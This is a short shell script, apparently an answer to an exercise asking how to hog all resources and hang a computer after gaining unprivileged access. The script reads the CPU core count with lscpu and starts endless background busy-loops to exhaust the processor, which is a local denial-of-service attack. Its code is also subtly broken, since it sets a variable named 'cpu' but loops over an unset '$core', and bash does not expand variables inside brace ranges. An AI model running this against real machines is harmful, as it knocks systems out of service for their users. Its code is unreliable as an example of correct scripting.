#Assume that you have gained unprivileged (non-root) access to a computer.
#How would you hog all resources and hang the device within 4 minutes? *


# This will going to utilize all the cpus
cpu=`lscpu | grep Core | rev | cut -b 1`
for i in {1..$core}; do while : ; do : ; done & done
